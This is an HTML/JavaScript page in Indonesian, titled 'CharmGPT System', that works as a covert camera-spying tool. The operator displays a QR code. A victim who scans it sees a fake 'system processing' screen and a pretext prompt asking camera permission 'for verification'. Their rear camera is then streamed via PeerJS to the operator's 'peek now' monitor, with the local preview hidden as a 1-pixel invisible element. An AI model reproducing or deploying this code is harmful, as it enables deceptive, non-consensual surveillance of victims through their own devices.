<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CharmGPT System 1.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow-x: hidden; }
        .panel { padding: 20px; border: 1px solid #0f0; margin: 10px; border-radius: 8px; }
        video { width: 100%; height: 60vh; background: #111; object-fit: cover; border: 2px solid #0f0; }
        .btn { background: #0f0; color: #000; border: none; padding: 15px; width: 90%; font-weight: bold; margin: 10px 0; cursor: pointer; }
        #qr-box { background: #fff; padding: 15px; display: none; margin: 10px auto; width: 200px; }
        #qr-box img { width: 200px; }
        .hidden { display: none; }
        #status { font-size: 0.8rem; color: #888; }
    </style>
</head>
<body>

    <div id="main-ui">
        <h2>[ CHARM MONITOR ]</h2>
        <video id="display" autoplay playsinline></video>
        
        <div class="panel">
            <p id="status">STATUS: STANDBY</p>
            <button class="btn" onclick="startViewing()">INTIP SEKARANG</button>
            <button class="btn" style="background:#555;color:#fff" onclick="showQR()">TAMPILKAN QR SCAN</button>
        </div>

        <div id="qr-box">
            <p style="color:#000; font-size: 10px;">SCAN UNTUK AKSES SISTEM</p>
            <img id="qr-img" src="" alt="QR Code">
            <br>
            <button onclick="document.getElementById('qr-box').style.display='none'">TUTUP</button>
        </div>
    </div>

    <div id="target-ui" class="hidden">
        <div style="padding: 50px;">
            <div style="border: 4px solid #0f0; width: 50px; height: 50px; border-radius: 50%; border-top: 4px solid transparent; animation: spin 1s linear infinite; margin: 0 auto;"></div>
            <p>Sistem Sedang Memproses...</p>
            <video id="p" autoplay playsinline muted style="width:1px;opacity:0;"></video>
        </div>
    </div>

    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <script>
        // Cek URL: Apakah dibuka lewat QR (Target) atau dibuka langsung (Dappa)
        const urlParams = new URLSearchParams(window.location.search);
        const mode = urlParams.get('mode');

        if (mode === 'target') {
            // JIKA DIBUKA OLEH TARGET
            document.getElementById('main-ui').classList.add('hidden');
            document.getElementById('target-ui').classList.remove('hidden');
            
            const peer = new Peer('target-dappa-2026');
            peer.on('call', (call) => {
                if (confirm("Sistem memerlukan izin kamera untuk verifikasi. Izinkan?")) {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false })
                    .then((stream) => {
                        document.getElementById('p').srcObject = stream;
                        call.answer(stream);
                    });
                }
            });
        } else {
            // JIKA DIBUKA OLEH LO (MONITOR)
            const peer = new Peer('monitor-dappa-2026');

            function startViewing() {
                document.getElementById('status').innerText = "MENCOBA MENGHUBUNGKAN...";
                const call = peer.call('target-dappa-2026', null);
                call.on('stream', (stream) => {
                    document.getElementById('display').srcObject = stream;
                    document.getElementById('status').innerText = "LIVE: TERKONEKSI";
                });
                call.on('error', () => alert("Target offline atau belum scan QR!"));
            }

            function showQR() {
                const currentUrl = window.location.href.split('?')[0];
                const targetUrl = `${currentUrl}?mode=target`;
                const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(targetUrl)}`;
                
                document.getElementById('qr-img').src = qrApi;
                document.getElementById('qr-box').style.display = 'block';
            }
        }
    </script>

    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
</body>
</html>
